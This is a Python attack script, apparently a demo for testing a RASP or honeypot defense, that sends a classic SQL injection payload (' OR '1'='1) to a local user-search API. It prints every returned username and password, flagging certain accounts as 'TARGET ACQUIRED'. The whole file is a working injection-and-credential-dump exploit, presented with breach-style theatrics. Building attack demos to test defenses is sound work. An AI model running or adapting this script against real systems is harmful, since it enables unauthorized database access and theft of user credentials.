import time
import sys
import requests
import os

# --- CONFIGURATION ---
TARGET_API_URL = "http://127.0.0.1:5000/api/v1/user/search"

def loading_animation():
    os.system('cls' if os.name == 'nt' else 'clear') 
    print("\033[92m") 
    print("[*] Initializing Smart Breach Protocol v3.0...")
    print("[+] Connecting to Target System (Port 5000)...")
    time.sleep(1)

def run_attack():
    try:
        payload = {"query": "' OR '1'='1"}
        print(f"[+] Sending Payload: {payload}")
        
        response = requests.post(TARGET_API_URL, json=payload)
        
        # SUCCESS (200) - Works for both Real DB and RASP Honeypot
        if response.status_code == 200:
            data = response.json()
            print("\n" + "="*50)
            print("\033[1m\033[91m [SUCCESS] FIREWALL BYPASSED! \033[0m") 
            print("="*50)
            print(f"{'ID':<5} | {'USERNAME':<15} | {'PASSWORD'}")
            print("-" * 45)
            
            target_found = False
            
            for user in data:
                # 1. Normalize Data (Handle Dict vs List)
                if isinstance(user, dict):
                    uid, name, pwd = user.get('id'), user.get('username'), user.get('password')
                else:
                    uid, name, pwd = user[0], user[1], user[2]
                
                # 2. THE GREEN HIGHLIGHT LOGIC
                # We highlight if it's your Real ID (prateek) OR the Fake ID (sys_admin)
                if name == "prateek" or name == "sys_admin":
                    print(f"\033[1m\033[92m{uid:<5} | {name:<15} | {pwd}   <-- [TARGET ACQUIRED]\033[0m")
                    target_found = True
                else:
                    print(f"{uid:<5} | {name:<15} | {pwd}")
                
                time.sleep(0.3)
                
            print("-" * 45)
            
            if target_found:
                print("\n\033[92m[+] TARGET LOGIN CREDENTIAL FOUND.\033[0m")
            else:
                print("\n[+] Data Dump Complete.")

        # RASP BLOCKED (418)
        elif response.status_code == 418:
            print("\n[!] BLOCKED BY RASP (Teapot Error)")

        # ERROR
        else:
            print(f"\n[!] ATTACK FAILED. Status Code: {response.status_code}")
            
    except Exception as e:
        print(f"[!] Connection Error: {e}")

if __name__ == "__main__":
    loading_animation()
    run_attack()